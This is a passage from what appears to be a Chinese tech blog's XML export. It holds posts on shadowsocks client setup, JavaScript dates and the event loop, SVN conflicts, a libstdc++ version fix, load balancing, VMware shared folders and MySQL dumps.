<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    "server":"0.0.0.0",  #填入你的IP地址</span><br><span class="line"></span><br><span class="line">    "local_address": "127.0.0.1",</span><br><span class="line"></span><br><span class="line">    "local_port":1080,</span><br><span class="line"></span><br><span class="line">    "port_password": &#123;</span><br><span class="line"></span><br><span class="line">        "8381": "foobar1",    #端口号，密码</span><br><span class="line"></span><br><span class="line">        "8382": "foobar2",</span><br><span class="line"></span><br><span class="line">        "8383": "foobar3",</span><br><span class="line"></span><br><span class="line">        "8384": "foobar4"</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    "timeout":300,</span><br><span class="line"></span><br><span class="line">    "method":"aes-256-cfb",</span><br><span class="line"></span><br><span class="line">    "fast_open": false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改成你自己的服务器信息。保存退出。</p>
<p>3、启动shadowsocks</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sslocal -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure>

<p>4、windows客户端:</p>
<p>ss客户端<a href="https://github.com/shadowsocks/shadowsocks-windows/releases" target="_blank" rel="noopener">下载链接</a> 在这里能找到所有历史版本和最新版本。直接下载后解压缩就可以用。</p>
<p>.NET下载链接</p>
<p>可能会提示你安装.NET 4.6.2。我的是shadowsock v4.0.6。要安装这个包。</p>
<p>.NET 4.6.2离线安装包下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=53344" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=53344</a></p>
<p>如果连外网不方便，内网上传了一个资源: <a href="http://download.csdn.net/download/junbujianwpl/10133518" target="_blank" rel="noopener">http://download.csdn.net/download/junbujianwpl/10133518</a></p>
<p>windows下使用</p>
<p>建议用pac模式。谁用谁知道。配置文件用默认的本地配置文件即可。然后呢，你的所有内网都走的原本线路，外网被墙的比如谷歌之类都走的shadowsock。真的很方便啊。。。。：）</p>
<p>客户端配置界面</p>
<p><img src="http://b306.photo.store.qq.com/psb?/V13BnsdD2I1FMK/IajKoFphBKIu4B*iXwpzdVqmMlwSRv7Hh5YQ9TwADZc!/b/dDIBAAAAAAAA&ek=1&kp=1&pt=0&bo=AALGAQAAAAAREOI!&tl=1&su=0231307649&vuin=651085543&tm=1564045200#sce=63-0-0&rf=v1_ht5_qz_3.4.0_001_idc_b-2-0" alt="ss client"></p>
<p>服务器地址写你的vps的ip地址即可。端口号、密码、加密方式都按照服务端的配置写即可。</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>var s=+newDate();</title>
    <url>/articles/var%20s-newDate-/</url>
    <content><![CDATA[<p>解释如下: <code>=+</code>是不存在的;</p>
<p><code>+new Date()</code>是一个东西;</p>
<p><code>+</code> 相当于<code>.valueOf()</code>;</p>
<p>下面4个结果一样，都返回当前时间的毫秒数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">alert(+<span class="keyword">new</span> <span class="built_in">Date</span>());<span class="comment">// 1564712654001</span></span><br><span class="line">alert(+<span class="keyword">new</span> <span class="built_in">Date</span>);  <span class="comment">// 1564712654001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s=<span class="keyword">new</span> <span class="built_in">Date</span>();  <span class="comment">// 1564712654001</span></span><br><span class="line">alert(s.valueOf());<span class="comment">// 1564712654001</span></span><br><span class="line">alert(s.getTime());<span class="comment">// 1564712654001</span></span><br></pre></td></tr></table></figure>

<p>获取当前时间</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="keyword">var</span> a=myDate.toLocaleString(); <span class="comment">// 2011-11-07 18:13:56</span></span><br></pre></td></tr></table></figure>

<p>顺便说下valueOf的另一个用法:</p>
<p>valueOf() 方法可返回 Boolean 对象的原始值。</p>
<p>如果调用该方法的对象不是 Boolean，则抛出异常 TypeError。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> boo = <span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">console</span>.log(boo.valueOf()); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(boo.valueOf())); <span class="comment">// boolean</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>vue的微信分享bug</title>
    <url>/articles/vue%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%88%86%E4%BA%ABbug/</url>
    <content><![CDATA[<p>vue 默认路由是带有#的，但是在微信分享中， 我们遇到这种bug:</p>
<p><a href="https://xxxxx.com/#a" target="_blank" rel="noopener">https://xxxxx.com/#a</a></p>
<p>分享成功，不能跳回到当前路由</p>
<p>解决方法</p>
<p><a href="https://xxxxx.com/" target="_blank" rel="noopener">https://xxxxx.com/</a></p>
<p>分享成功，能跳回到当前路由</p>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>svn常见问题汇总(持续更新)</title>
    <url>/articles/svn%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<h3 id="Skipped-‘xxxxxx’-Node-remains-in-conflict"><a href="#Skipped-‘xxxxxx’-Node-remains-in-conflict" class="headerlink" title="Skipped ‘xxxxxx’ Node remains in conflict"></a>Skipped ‘xxxxxx’ Node remains in conflict</h3><p><strong>问题描述</strong></p>
<p>svn up 的时候报错显示 Skipped ‘app/Extend/assets/ttfs’ – Node remains in conflict 说app/Extend/assets/ttfs被忽略了，因为冲突而且app/Extend/assets/ttfs又被更新回来了，还是旧版本的内容，之前修改的标题并没有被修改,如图<br><img src="/articles/svn常见问题汇总-持续更新/20200326123238.png" alt="问题描述"></p>
<p><strong>解决方法</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">svn revert --depth=infinity 冲突文件/文件夹</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">svn remove --force filename</span><br><span class="line"></span><br><span class="line">svn resolve --accept=working  filename</span><br><span class="line"></span><br><span class="line">svn up</span><br></pre></td></tr></table></figure>

<h3 id="E220001-遇到不可读的路径；拒绝访问"><a href="#E220001-遇到不可读的路径；拒绝访问" class="headerlink" title="E220001: 遇到不可读的路径；拒绝访问"></a>E220001: 遇到不可读的路径；拒绝访问</h3><p>在客户端试图 svn merge 总是报svn: E220001: 遇到不可读的路径；拒绝访问。这个错误</p>
<p>提示 : SVN 遇到不可读的路径；拒绝访问。 英文是: Unreadable path encountered; access denied</p>
<p>在项目的conf/svnserve.conf 中, 设置 anon-access = none 即可. 然后重启Subversion 服务.</p>
<p>如果本地SVN客户端查看过日志会有缓存, 需要在 设置-&gt;日志缓存-&gt;缓存的版本库 中删除有问题的版本缓存 再重新查看日志就好了.</p>
<h3 id="Conflict-not-set"><a href="#Conflict-not-set" class="headerlink" title="Conflict not set"></a>Conflict not set</h3><p><img src="/articles/svn常见问题汇总-持续更新/20200407103201.png" alt></p>
<ul>
<li><p>对于纯文本文件因版本过时提交失败的情况，我们可以选择更新一下，然后打开”自己的修改和服务器最新版合并“后的文件（如发生冲突时的A文件），进行手动合并，处理好后选择 <code>resolve</code>然后提交。</p>
</li>
<li><p>对于非纯文本文件因版本过时提交失败时，我们只能牺牲一下自己，选择<code>revert</code>，然后更新到服务器最新版本，再修改提交</p>
</li>
</ul>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>/usr/lib/libstdc++.so.6： version `GLIBCXX_3.4.15&#39; not found错误的解决</title>
    <url>/articles/usr-lib-libstdc-so-6-%20version%20-GLIBCXX-3-4-15-%20not%20found%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<p>升级cmake时，提示“Error when bootstrapping CMake:Problem while running initial CMake”，第二次运行./bootstrap时，直接的给出了错误原因：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost cmake-2.8.12.2]# ./bootstrap</span><br><span class="line"></span><br><span class="line">---------------------------------------------</span><br><span class="line"></span><br><span class="line">gmake: “cmake”是最新的。</span><br><span class="line"></span><br><span class="line">/home/src/cmake-2.8.12.2/Bootstrap.cmk/cmake: /usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.15&apos; not found (required by /home/src/cmake-2.8.12.2/Bootstrap.cmk/cmake)</span><br><span class="line"></span><br><span class="line">---------------------------------------------</span><br><span class="line"></span><br><span class="line">Error when bootstrapping CMake:</span><br><span class="line"></span><br><span class="line">Problem while running initial CMake</span><br><span class="line"></span><br><span class="line">---------------------------------------------</span><br><span class="line"></span><br><span class="line">缺少GLIBCXX_3.4.15版本，或是更高的版本。</span><br></pre></td></tr></table></figure>

<p>为了核实版本问题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost cmake-2.8.12.2]# strings /usr/lib64/libstdc++.so.6 | grep GLIBCXX</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.1</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.2</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.3</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.4</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.5</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.6</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.7</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.8</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.9</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.10</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.11</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.12</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.13</span><br><span class="line"></span><br><span class="line">GLIBCXX_FORCE_NEW</span><br><span class="line"></span><br><span class="line">GLIBCXX_DEBUG_MESSAGE_LENGTH</span><br></pre></td></tr></table></figure>

<p>我们看到当前GCC版本中的确没有GLIBCXX_3.4.15,考虑到刚安装过新版的GCC ,似乎不应该出现这样的问题。</p>
<p>顺着gcc安装路径，找到了新的libstdc++：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost cmake-2.8.12.2]# strings /usr/local/lib64/libstdc++.so.6.0.20|grep GLIBCXX</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.1</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.2</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.3</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.4</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.5</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.6</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.7</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.8</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.9</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.10</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.11</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.12</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.13</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.14</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.15</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.16</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.17</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.18</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.19</span><br><span class="line"></span><br><span class="line">GLIBCXX_3.4.20</span><br><span class="line"></span><br><span class="line">GLIBCXX_FORCE_NEW</span><br><span class="line"></span><br><span class="line">GLIBCXX_DEBUG_MESSAGE_LENGTH</span><br></pre></td></tr></table></figure>

<p>这里该有的都有了，把这份软链到正确的地方，就妥了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost cmake-2.8.12.2]# cp /usr/local/lib64/libstdc++.so.6.0.20 /usr/lib64/</span><br><span class="line"></span><br><span class="line">[root@localhost cmake-2.8.12.2]# cd /usr/lib64/</span><br><span class="line"></span><br><span class="line">[root@localhost lib64]# rm -f libstdc++.so.6</span><br><span class="line"></span><br><span class="line">[root@localhost lib64]# ln -s libstdc++.so.6.0.20 libstdc++.so.6</span><br><span class="line"></span><br><span class="line">[root@localhost lib64]# ll libstdc*</span><br><span class="line"></span><br><span class="line">lrwxrwxrwx. 1 root root      19  5月  12 13:34 libstdc++.so.6 -&gt; libstdc++.so.6.0.20</span><br><span class="line"></span><br><span class="line">-rwxr-xr-x. 1 root root  987096 11月  22 02:08 libstdc++.so.6.0.13</span><br><span class="line"></span><br><span class="line">-rwxr-xr-x. 1 root root 6700716  5月  12 13:33 libstdc++.so.6.0.20</span><br></pre></td></tr></table></figure>

<p>此后，再进行编译安装就顺畅了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">./bootstrap</span><br><span class="line"></span><br><span class="line">gmake</span><br><span class="line"></span><br><span class="line">make install</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>一分钟了解负载均衡的一切</title>
    <url>/articles/%E4%B8%80%E5%88%86%E9%92%9F%E4%BA%86%E8%A7%A3%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E4%B8%80%E5%88%87/</url>
    <content><![CDATA[<h3 id="什么是负载均衡"><a href="#什么是负载均衡" class="headerlink" title="什么是负载均衡"></a>什么是负载均衡</h3><p>负载均衡(Load Balance)是分布式系统架构设计中必须考虑的因素之一，它通常是指，将请求/数据【均匀】分摊到多个操作单元上执行，负载均衡的关键在于【均匀】。</p>
<h3 id="常见的负载均衡方案"><a href="#常见的负载均衡方案" class="headerlink" title="常见的负载均衡方案"></a>常见的负载均衡方案</h3><p><img src="/articles/一分钟了解负载均衡的一切/0.png" alt="Load Balance"></p>
<p>常见互联网分布式架构如上，分为客户端层、反向代理nginx层、站点层、服务层、数据层。可以看到，每一个下游都有多个上游调用，只需要做到，每一个上游都均匀访问每一个下游，就能实现“将请求/数据【均匀】分摊到多个操作单元上执行”。</p>
<ul>
<li><p>【客户端层-&gt;反向代理层】的负载均衡</p>
<p>  <img src="/articles/一分钟了解负载均衡的一切/1.png" alt="Load Balance"></p>
</li>
<li><p>【客户端层】到【反向代理层】的负载均衡，是通过“DNS轮询”实现的：DNS-server对于一个域名配置了多个解析ip，每次DNS解析请求来访问DNS-server，会轮询返回这些ip，保证每个ip的解析概率是相同的。这些ip就是nginx的外网ip，以做到每台nginx的请求分配也是均衡的。</p>
</li>
<li><p>【反向代理层-&gt;站点层】的负载均衡</p>
<p>  <img src="/articles/一分钟了解负载均衡的一切/2.png" alt="Load Balance"></p>
</li>
<li><p>【反向代理层】到【站点层】的负载均衡，是通过“nginx”实现的。通过修改nginx.conf，可以实现多种负载均衡策略：</p>
<p>  1)请求轮询：和DNS轮询类似，请求依次路由到各个web-server</p>
<p>  2)最少连接路由：哪个web-server的连接少，路由到哪个web-server</p>
<p>  3)ip哈希：按照访问用户的ip哈希值来路由web-server，只要用户的ip分布是均匀的，请求理论上也是均匀的，ip哈希均衡方法可以做到，同一个用户的请求固定落到同一台web-server上，此策略适合有状态服务，例如session(58沈剑备注：可以这么做，但强烈不建议这么做，站点层无状态是分布式架构设计的基本原则之一，session最好放到数据层存储)</p>
</li>
<li><p>【站点层-&gt;服务层】的负载均衡</p>
<p>  <img src="/articles/一分钟了解负载均衡的一切/3.png" alt="Load Balance"></p>
</li>
<li><p>【站点层】到【服务层】的负载均衡，是通过“服务连接池”实现的。</p>
<p>  上游连接池会建立与下游服务多个连接，每次请求会“随机”选取连接来访问下游服务。</p>
</li>
<li><p>【数据层】的负载均衡</p>
<p>  在数据量很大的情况下，由于数据层(db，cache)涉及数据的水平切分，所以数据层的负载均衡更为复杂一些，它分为“数据的均衡”，与“请求的均衡”。</p>
<p>  数据的均衡是指：水平切分后的每个服务(db，cache)，数据量是差不多的。</p>
<p>  请求的均衡是指：水平切分后的每个服务(db，cache)，请求量是差不多的。</p>
<p>  业内常见的水平切分方式有这么几种：</p>
<p>  1、按照range水平切分</p>
<p>  <img src="/articles/一分钟了解负载均衡的一切/4.png" alt="Load Balance"></p>
<p>  每一个数据服务，存储一定范围的数据，上图为例：</p>
<p>  user0服务，存储uid范围1-1kw</p>
<p>  user1服务，存储uid范围1kw-2kw</p>
<p>  这个方案的好处是：</p>
<pre><code>(1)规则简单，service只需判断一下uid范围就能路由到对应的存储服务

(2)数据均衡性较好

(3)比较容易扩展，可以随时加一个uid[2kw,3kw]的数据服务</code></pre><p>  不足是：</p>
<pre><code>(1)请求的负载不一定均衡，一般来说，新注册的用户会比老用户更活跃，大range的服务请求压力会更大</code></pre><p>  2、按照id哈希水平切分</p>
<p>  <img src="/articles/一分钟了解负载均衡的一切/5.png" alt="Load Balance"></p>
<p>  每一个数据服务，存储某个key值hash后的部分数据，上图为例：</p>
<p>  user0服务，存储偶数uid数据</p>
<p>  user1服务，存储奇数uid数据</p>
<p>  这个方案的好处是：</p>
<pre><code>(1)规则简单，service只需对uid进行hash能路由到对应的存储服务

(2)数据均衡性较好

(3)请求均匀性较好</code></pre><p>  不足是：</p>
<pre><code>(1)不容易扩展，扩展一个数据服务，hash方法改变时候，可能需要进行数据迁移</code></pre></li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>负载均衡(Load Balance)是分布式系统架构设计中必须考虑的因素之一，它通常是指，将请求/数据【均匀】分摊到多个操作单元上执行，负载均衡的关键在于【均匀】。</p>
<p>(1)【客户端层】到【反向代理层】的负载均衡，是通过“DNS轮询”实现的</p>
<p>(2)【反向代理层】到【站点层】的负载均衡，是通过“nginx”实现的</p>
<p>(3)【站点层】到【服务层】的负载均衡，是通过“服务连接池”实现的</p>
<p>(4)【数据层】的负载均衡，要考虑“数据的均衡”与“请求的均衡”两个点，常见的方式有“按照范围水平切分”与“hash水平切分”</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>vmware文件夹共享</title>
    <url>/articles/vmware%E6%96%87%E4%BB%B6%E5%A4%B9%E5%85%B1%E4%BA%AB/</url>
    <content><![CDATA[<p>1.虚拟机设置 -&gt; 选项 -&gt; 共享文件夹 -&gt; 总是启用 -&gt; 选择宿主机要映射的目录</p>
<blockquote>
<p>注意，虚拟机如果没有安装vmware-tools， 文件夹共享 将不可点击，需要先安装vmware-tools后才可以选择启用文件共享。<a href="https://docs.vmware.com/cn/VMware-Workstation-Player-for-Windows/16.0/com.vmware.player.win.using.doc/GUID-08BB9465-D40A-4E16-9E15-8C016CC8166F.html" target="_blank" rel="noopener">安装方法</a></p>
</blockquote>
<p><img src="/articles/vmware文件夹共享/%E5%BC%80%E5%90%AF%E6%96%87%E4%BB%B6%E5%A4%B9%E5%85%B1%E4%BA%AB.png" alt></p>
<p>接下来切换到linux</p>
<ol start="2">
<li>安装vm-tools</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y open-vm-tools open-vm-tools-desktop</span><br></pre></td></tr></table></figure>

<p>安装完后执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vmware-hgfsclient</span><br></pre></td></tr></table></figure>

<p>我们先创建一个文件夹，再映射vmware共享文件夹到这个目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /data/</span><br><span class="line">vmhgfs-fuse .host:/ /data/ -o allow_other -o nonempty</span><br></pre></td></tr></table></figure>

<p>其中 /data/vm/ 就是linux和主机共享的目录，vm就是我们第一步文件共享时的建立的名称</p>
<p>这时候我们就可以像正常linux下文件一样去操作 /data/vm 下的文件</p>
<p><img src="/articles/vmware文件夹共享/%E6%95%88%E6%9E%9C.png" alt></p>
<ol start="3">
<li>重启失效问题</li>
</ol>
<p>linux重启后会导致挂载失效，需要重新挂载 所以我们写到开机自启脚本里</p>
<p>给执行权限 centos7 默认 /etc/rc.d/rc.local 无执行权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>

<p>打开/etc/rc.d/rc.local 在最下面加入挂载命令</p>
<p>自动挂载vmware宿主机的共享文件夹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vmhgfs-fuse .host:/ /data/ -o allow_other -o nonempty</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>将目录软连到web目录 (可选)</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /data/vm/ /data/wwwroot</span><br></pre></td></tr></table></figure>

<p>然后创建站点，解析hosts</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>window下数据库导入导出</title>
    <url>/articles/window%E4%B8%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/</url>
    <content><![CDATA[<h4 id="导出整个数据库"><a href="#导出整个数据库" class="headerlink" title="导出整个数据库"></a>导出整个数据库</h4><p>mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> mysqldump -u dbuser -p dbname &gt; dbname.sql</span></span><br></pre></td></tr></table></figure>

<h4 id="导出一个表"><a href="#导出一个表" class="headerlink" title="导出一个表"></a>导出一个表</h4><p>mysqldump -u 用户名 -p 数据库名 表名&gt; 导出的文件名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> mysqldump -u dbuser -p dbname users&gt; dbname_users.sql</span></span><br></pre></td></tr></table></figure>

<h4 id="导出一个数据库结构"><a href="#导出一个数据库结构" class="headerlink" title="导出一个数据库结构"></a>导出一个数据库结构</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -u dbuser -p -d --add-drop-table dbname &gt;d:/dbname_db.sql</span><br></pre></td></tr></table></figure>

<p>-d 没有数据 –add-drop-table 在每个create语句之前增加一个drop table</p>
<h4 id="导入数据库"><a href="#导入数据库" class="headerlink" title="导入数据库"></a>导入数据库</h4><p>常用source 命令, 进入mysql数据库控制台，如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> use 数据库</span></span><br></pre></td></tr></table></figure>

<p>然后使用source命令，后面参数为脚本文件(如这里用到的.sql)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">source</span> d:/dbname.sql</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>导入导出</tag>
      </tags>
  </entry>
  <entry>
    <title>一文读懂JavaScript的并发模型和事件循环机制</title>
    <url>/articles/%E4%B8%80%E6%96%87%E8%AF%BB%E6%87%82JavaScript%E7%9A%84%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%9E%8B%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>我们知道JS语言是串行执行、阻塞式、事件驱动的，那么它又是怎么支持并发处理数据的呢？</p>
<h2 id="“单线程”语言"><a href="#“单线程”语言" class="headerlink" title="“单线程”语言"></a>“单线程”语言</h2><p>在浏览器实现中，每个单页都是一个独立进程，其中包含了JS引擎、GUI界面渲染、事件触发、定时触发器、异步HTTP请求等多个线程。</p>
<blockquote>
<p>进程（Process）是操作系统CPU等资源分配的最小单位，是程序的执行实体，是线程的容器。<br>线程（Thread）是操作系统能够进行运算调度的最小单位，一条线程指的是进程中一个单一顺序的控制流。</p>
</blockquote>
<p>因此我们可以说JS是”单线程”式的语言，代码只能按照单一顺序进行串行执行，并在执行完成前阻塞其他代码。</p>
<h2 id="JS数据结构"><a href="#JS数据结构" class="headerlink" title="JS数据结构"></a>JS数据结构</h2><p><img src="/articles/一文读懂JavaScript的并发模型和事件循环机制/JS%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="JS数据结构"></p>
<p>如上图所示为JS的几种重要数据结构：</p>
<ul>
<li>栈（Stack）：用于JS的函数嵌套调用，后进先出，直到栈被清空。</li>
<li>堆（Heap）：用于存储大块数据的内存区域，如对象。</li>
<li>队列（Queue）：用于事件循环机制，先进先出，直到队列为空。</li>
</ul>
<h2 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h2><p>我们的经验告诉我们JS是可以并发执行的，比如定时任务、并发AJAX请求，那这些是怎么完成的呢？其实这些都是JS在用单线程模拟多线程完成的。</p>
<p><img src="/articles/一文读懂JavaScript的并发模型和事件循环机制/%E4%BA%8B%E4%BB%B6%E9%98%9F%E5%88%97.png" alt="事件队列"></p>
<p>如上图所示，JS串行执行主线程任务，当遇到异步任务如定时器时，将其放入事件队列中，在主线程任务执行完毕后，再去事件队列中遍历取出队首任务进行执行，直至队列为空。</p>
<p>全部执行完成后，会有主监控进程，持续检测队列是否为空，如果不为空，则继续事件循环。</p>
<h2 id="setTimeout定时任务"><a href="#setTimeout定时任务" class="headerlink" title="setTimeout定时任务"></a>setTimeout定时任务</h2><p>定时任务<code>setTimeout(fn, timeout)</code>会先被交给浏览器的定时器模块，等延迟时间到了，再将事件放入到事件队列里，等主线程执行结束后，如果队列中没有其他任务，则会被立即处理，而如果还有没有执行完成的任务，则需要等前面的任务都执行完成才会被执行。因此setTimeout的第2个参数是最少延迟时间，而非等待时间。</p>
<p>当我们预期到一个操作会很繁重耗时又不想阻塞主线程的执行时，会使用立即执行任务：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">setTimeout(fn, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h3 id="特殊场景1：最小延迟为1ms"><a href="#特殊场景1：最小延迟为1ms" class="headerlink" title="特殊场景1：最小延迟为1ms"></a>特殊场景1：最小延迟为1ms</h3><p>然而考虑这么一段代码会怎么执行：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="number">5</span>)&#125;,<span class="number">5</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="number">4</span>)&#125;,<span class="number">4</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="number">3</span>)&#125;,<span class="number">3</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="number">2</span>)&#125;,<span class="number">2</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="number">1</span>)&#125;,<span class="number">1</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="number">0</span>)&#125;,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>了解完事件队列机制，你的答案应该是<code>0,1,2,3,4,5</code>，然而答案却是<code>1,0,2,3,4,5</code>，这个是因为浏览器的实现机制是最小间隔为1ms。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://github.com/nodejs/node/blob/v8.9.4/lib/timers.js#L456</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(after &gt;= <span class="number">1</span> &amp;&amp; after &lt;= TIMEOUT_MAX))</span><br><span class="line">  after = <span class="number">1</span>; <span class="comment">// schedule on next tick, follows browser behavior</span></span><br></pre></td></tr></table></figure>

<p>浏览器以32位bit来存储延时，如果大于 <code>2^32-1 ms(24.8天)</code>，导致溢出会立刻执行。</p>
<h3 id="特殊场景2：最小延迟为4ms"><a href="#特殊场景2：最小延迟为4ms" class="headerlink" title="特殊场景2：最小延迟为4ms"></a>特殊场景2：最小延迟为4ms</h3><p>定时器的嵌套调用超过4层时，会导致最小间隔为4ms：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cb</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i, <span class="keyword">new</span> <span class="built_in">Date</span>().getMilliseconds());</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">20</span>) setTimeout(cb, <span class="number">0</span>);</span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(cb, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

